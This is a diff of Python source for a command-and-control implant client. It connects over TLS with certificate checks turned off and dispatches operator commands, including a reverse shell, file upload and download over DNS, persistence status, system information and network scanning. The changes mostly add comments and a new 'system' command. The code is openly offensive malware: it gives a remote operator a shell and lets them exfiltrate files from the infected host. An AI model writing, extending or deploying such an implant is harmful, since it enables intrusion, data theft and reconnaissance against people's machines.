@@ -477,10 +477,12 @@ def init_connection() -> ssl.SSLSocket:
     context.verify_mode = ssl.CERT_NONE
     ss = context.wrap_socket(s)
 
-    # Connect to C2 server
+    # Get server address if exported payload
     global HOST, PORT
     if "HOST" not in globals() and "PORT" not in globals():
         HOST, PORT = "127.0.0.1", 8000
+
+    # Connect to C2 server
     ss.connect((HOST, PORT))
 
     return ss
@@ -494,27 +496,36 @@ def process_instructions(ss: ssl.SSLSocket, persistence: dict):
             buffer1 = buffer.split(b" ")[0]
             match buffer1:
                 case b"ping":
+                    # Check if client is active
                     ss.send(b"pong")
+                case b"system":
+                    ss.send(SYSTEM.encode())
                 case b"shell":
+                    # Start reverse shell mode
                     reverse_shell(ss)
                 case b"persistence":
+                    # Show persistence status
                     ss.send(persistence.__str__().encode())
                 case b"exists":
+                    # Check if file exists
                     if os.path.isfile(buffer.split(b" ")[1]):
                         ss.send(b"ok")
                     else:
                         ss.send(b"ko")
                 case b"send":
+                    # Upload a file to server
                     if dns_send(buffer.split(b" ")[1]):
                         ss.send(b"ok")
                     else:
                         ss.send(b"ko")
                 case b"receive":
+                    # Download a file from server
                     if dns_receive(buffer.split(b" ")[1]):
                         ss.send(b"ok")
                     else:
                         ss.send(b"ko")
                 case b"scan":
+                    # Start a network scan
                     output = start_network_scan(buffer.split(b" ")[1].decode())
                     ss.send(output.encode())
                 case _:
